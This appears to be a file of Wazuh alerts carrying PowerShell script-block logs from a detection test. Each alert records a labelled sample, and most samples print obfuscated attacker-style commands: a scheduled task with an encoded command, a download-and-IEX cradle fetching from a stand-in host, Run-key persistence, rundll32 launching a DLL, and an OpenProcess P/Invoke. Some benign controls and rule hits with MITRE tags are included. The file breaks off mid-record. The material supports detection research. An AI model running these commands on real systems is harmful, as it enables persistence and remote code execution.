{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"72cdccc5-0a8a-4935-9ee4-09ecdc4199dd","scriptBlockText":"$sampleId='PST-198'; $indicator='reGiStER-SCheDULEDtAsK -TasKNAmE ''updATEChECK'' -acTION (NEW-sCHeDuLedtaskAcTioN -ExEcUTe ''POwErshelL.eXE'' -arGUMENT ''-NoPROfILE -ENcOdedcomManD vWbyAGKaDablac0aTWB1AhqacAB1AHQaIAANAFQASABFAfMASQBtAC0ASQbOAEuAUgbuacCA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723253","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-198'; $indicator='reGiStER-SCheDULEDtAsK -TasKNAmE ''updATEChECK'' -acTION (NEW-sCHeDuLedtaskAcTioN -ExEcUTe ''POwErshelL.eXE'' -arGUMENT ''-NoPROfILE -ENcOdedcomManD vWbyAGKaDablac0aTWB1AhqacAB1AHQaIAANAFQASABFAfMASQBtAC0ASQbOAEuAUgbuacCA'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 72cdccc5-0a8a-4935-9ee4-09ecdc4199dd\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:08.3981382Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:08.3981382Z\",\"eventRecordID\":\"723253\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-198'; $indicator='reGiStER-SCheDULEDtAsK -TasKNAmE ''updATEChECK'' -acTION (NEW-sCHeDuLedtaskAcTioN -ExEcUTe ''POwErshelL.eXE'' -arGUMENT ''-NoPROfILE -ENcOdedcomManD vWbyAGKaDablac0aTWB1AhqacAB1AHQaIAANAFQASABFAfMASQBtAC0ASQbOAEuAUgbuacCA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 72cdccc5-0a8a-4935-9ee4-09ecdc4199dd\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-198'; $indicator='reGiStER-SCheDULEDtAsK -TasKNAmE ''updATEChECK'' -acTION (NEW-sCHeDuLedtaskAcTioN -ExEcUTe ''POwErshelL.eXE'' -arGUMENT ''-NoPROfILE -ENcOdedcomManD vWbyAGKaDablac0aTWB1AhqacAB1AHQaIAANAFQASABFAfMASQBtAC0ASQbOAEuAUgbuacCA'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"72cdccc5-0a8a-4935-9ee4-09ecdc4199dd\"}}}","id":"1784281029.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:09.410+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"28204e83-3dd2-4edf-807d-c67f9a39829d","scriptBlockText":"$sampleId='PST-199'; $indicator='$cmd=(''Inv' + '''+''o' + 'ke-Exp' + 'ression'');' + ' &amp; (Get-C' + 'ommand ' + '$cmd)' + ' \\\"Write' + '-Output ''' + 'THESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723257","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-199'; $indicator='$cmd=(''Inv' + '''+''o' + 'ke-Exp' + 'ression'');' + ' & (Get-C' + 'ommand ' + '$cmd)' + ' \"Write' + '-Output ''' + 'THESIS-INERT''\"'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 28204e83-3dd2-4edf-807d-c67f9a39829d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:08.7389690Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:08.7389690Z\",\"eventRecordID\":\"723257\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-199'; $indicator='$cmd=(''Inv' + '''+''o' + 'ke-Exp' + 'ression'');' + ' & (Get-C' + 'ommand ' + '$cmd)' + ' \\\"Write' + '-Output ''' + 'THESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 28204e83-3dd2-4edf-807d-c67f9a39829d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-199'; $indicator='$cmd=(''Inv' + '''+''o' + 'ke-Exp' + 'ression'');' + ' &amp; (Get-C' + 'ommand ' + '$cmd)' + ' \\\\\\\"Write' + '-Output ''' + 'THESIS-INERT''\\\\\\\"'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"28204e83-3dd2-4edf-807d-c67f9a39829d\"}}}","id":"1784281029.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:09.419+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d14ac0e7-15a7-449e-9970-ed9d8ddb0d1c","scriptBlockText":"$sampleId='PST-200'; $indicator='$x=New-Ob`ject -ComObje`ct MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.in`valid/task'',$false); $x.Send(); IEX $x.ResponseT`e`xt'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723262","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-200'; $indicator='$x=New-Ob`ject -ComObje`ct MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.in`valid/task'',$false); $x.Send(); IEX $x.ResponseT`e`xt'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d14ac0e7-15a7-449e-9970-ed9d8ddb0d1c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:09.0784570Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:09.0784570Z\",\"eventRecordID\":\"723262\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-200'; $indicator='$x=New-Ob`ject -ComObje`ct MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.in`valid/task'',$false); $x.Send(); IEX $x.ResponseT`e`xt'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d14ac0e7-15a7-449e-9970-ed9d8ddb0d1c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-200'; $indicator='$x=New-Ob`ject -ComObje`ct MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.in`valid/task'',$false); $x.Send(); IEX $x.ResponseT`e`xt'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d14ac0e7-15a7-449e-9970-ed9d8ddb0d1c\"}}}","id":"1784281029.550467","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":7,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:37:09.431+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8da22db4-38d9-45e8-9b98-b5c99ae9ccbc","scriptBlockText":"$sampleId='PST-201'; $template = 'backup_path=%ProgramData%\\\\Company\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723267","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-201'; $template = 'backup_path=%ProgramData%\\Company\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8da22db4-38d9-45e8-9b98-b5c99ae9ccbc\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:09.4110564Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:09.4110564Z\",\"eventRecordID\":\"723267\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-201'; $template = 'backup_path=%ProgramData%\\\\Company\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8da22db4-38d9-45e8-9b98-b5c99ae9ccbc\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-201'; $template = 'backup_path=%ProgramData%\\\\\\\\Company\\\\\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8da22db4-38d9-45e8-9b98-b5c99ae9ccbc\"}}}","id":"1784281030.550467","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:10.419+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8c4886ae-a70f-448d-8fe2-293a69edef63","scriptBlockText":"$sampleId='PST-202'; $parts=@('neW-itemp`R`oper','Ty -paTH ''hKcu:\\\\So','fTWArE\\\\MiCrOsof','t\\\\wi`nDowS\\\\c','UrRe`NT`vERsi','on\\\\rUN'' -NAmE ','''UPdaTE`ChECk'' -VAl','uE ''PoWE`rSheLl','.EXe -WiNdO`WSt','Yle HiD`dEn -FILE ','C:\\\\__Thes`Is','_INERT__\\\\StaGe.p','s1'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723280","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-202'; $parts=@('neW-itemp`R`oper','Ty -paTH ''hKcu:\\So','fTWArE\\MiCrOsof','t\\wi`nDowS\\c','UrRe`NT`vERsi','on\\rUN'' -NAmE ','''UPdaTE`ChECk'' -VAl','uE ''PoWE`rSheLl','.EXe -WiNdO`WSt','Yle HiD`dEn -FILE ','C:\\__Thes`Is','_INERT__\\StaGe.p','s1'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8c4886ae-a70f-448d-8fe2-293a69edef63\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:09.7479115Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:09.7479115Z\",\"eventRecordID\":\"723280\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-202'; $parts=@('neW-itemp`R`oper','Ty -paTH ''hKcu:\\\\So','fTWArE\\\\MiCrOsof','t\\\\wi`nDowS\\\\c','UrRe`NT`vERsi','on\\\\rUN'' -NAmE ','''UPdaTE`ChECk'' -VAl','uE ''PoWE`rSheLl','.EXe -WiNdO`WSt','Yle HiD`dEn -FILE ','C:\\\\__Thes`Is','_INERT__\\\\StaGe.p','s1'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8c4886ae-a70f-448d-8fe2-293a69edef63\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-202'; $parts=@('neW-itemp`R`oper','Ty -paTH ''hKcu:\\\\\\\\So','fTWArE\\\\\\\\MiCrOsof','t\\\\\\\\wi`nDowS\\\\\\\\c','UrRe`NT`vERsi','on\\\\\\\\rUN'' -NAmE ','''UPdaTE`ChECk'' -VAl','uE ''PoWE`rSheLl','.EXe -WiNdO`WSt','Yle HiD`dEn -FILE ','C:\\\\\\\\__Thes`Is','_INERT__\\\\\\\\StaGe.p','s1'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8c4886ae-a70f-448d-8fe2-293a69edef63\"}}}","id":"1784281030.550467","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:10.533+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b7f6ded5-3fe5-4930-9306-6929ec3ae772","scriptBlockText":"$sampleId='PST-203'; $indicator='Get-Pro`cess | Select-Ob`ject Name,Id,Path'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723282","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-203'; $indicator='Get-Pro`cess | Select-Ob`ject Name,Id,Path'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b7f6ded5-3fe5-4930-9306-6929ec3ae772\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:10.0721049Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:10.0721049Z\",\"eventRecordID\":\"723282\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-203'; $indicator='Get-Pro`cess | Select-Ob`ject Name,Id,Path'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b7f6ded5-3fe5-4930-9306-6929ec3ae772\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-203'; $indicator='Get-Pro`cess | Select-Ob`ject Name,Id,Path'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b7f6ded5-3fe5-4930-9306-6929ec3ae772\"}}}","id":"1784281030.550467","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:10.563+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"be1290d0-044b-4ba2-ab52-db44975c086c","scriptBlockText":"$sampleId='PST-204'; $indicator='RundLL32.eXE C:\\\\__thesis_InERt__\\\\sTaGE.dLl,ENtRypOiNT'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723285","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-204'; $indicator='RundLL32.eXE C:\\__thesis_InERt__\\sTaGE.dLl,ENtRypOiNT'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: be1290d0-044b-4ba2-ab52-db44975c086c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:10.4005833Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:10.4005833Z\",\"eventRecordID\":\"723285\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-204'; $indicator='RundLL32.eXE C:\\\\__thesis_InERt__\\\\sTaGE.dLl,ENtRypOiNT'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: be1290d0-044b-4ba2-ab52-db44975c086c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-204'; $indicator='RundLL32.eXE C:\\\\\\\\__thesis_InERt__\\\\\\\\sTaGE.dLl,ENtRypOiNT'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"be1290d0-044b-4ba2-ab52-db44975c086c\"}}}","id":"1784281030.550467","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:10.609+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e29109ae-93fe-4572-8ea9-bad00796ce3b","scriptBlockText":"$sampleId='PST-205'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723288","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-205'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e29109ae-93fe-4572-8ea9-bad00796ce3b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:10.7323229Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:10.7323229Z\",\"eventRecordID\":\"723288\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-205'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e29109ae-93fe-4572-8ea9-bad00796ce3b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-205'; Get-CimInstance Win32_Process | Where-Object Name -like '*host*' | Select-Object -First 5 Name, ProcessId; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e29109ae-93fe-4572-8ea9-bad00796ce3b\"}}}","id":"1784281031.550467","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:11.648+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a86993cf-1ee3-40df-9256-615232c16015","scriptBlockText":"$sampleId='PST-206'; Get-ChildItem Cert:\\\\CurrentUser\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723292","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-206'; Get-ChildItem Cert:\\CurrentUser\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a86993cf-1ee3-40df-9256-615232c16015\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:11.2419344Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:11.2419344Z\",\"eventRecordID\":\"723292\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-206'; Get-ChildItem Cert:\\\\CurrentUser\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a86993cf-1ee3-40df-9256-615232c16015\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-206'; Get-ChildItem Cert:\\\\\\\\CurrentUser\\\\\\\\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a86993cf-1ee3-40df-9256-615232c16015\"}}}","id":"1784281031.553172","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script searching filesystem","firedtimes":3,"groups":["windows"," powershell"],"id":"91819","level":4,"mail":false,"mitre":{"id":["T1083"],"tactic":["Discovery"],"technique":["File and Directory Discovery"]}},"timestamp":"2026-07-17T11:37:11.684+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"69904579-3357-4610-ad86-00c7e5bae506","scriptBlockText":"$sampleId='PST-207'; $indicator='Add-Type -MemberDe`fin`ition ''[Dl`lImport(\\\"kern`el32.dll\\\")] public stat`ic extern Int`Ptr Ope`nProcess(uint access, bool inherit, int pr`ocessId);'' -Name Nat`iveMetho`ds -Names`pace Thes`is.Inert'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723296","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-207'; $indicator='Add-Type -MemberDe`fin`ition ''[Dl`lImport(\"kern`el32.dll\")] public stat`ic extern Int`Ptr Ope`nProcess(uint access, bool inherit, int pr`ocessId);'' -Name Nat`iveMetho`ds -Names`pace Thes`is.Inert'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" 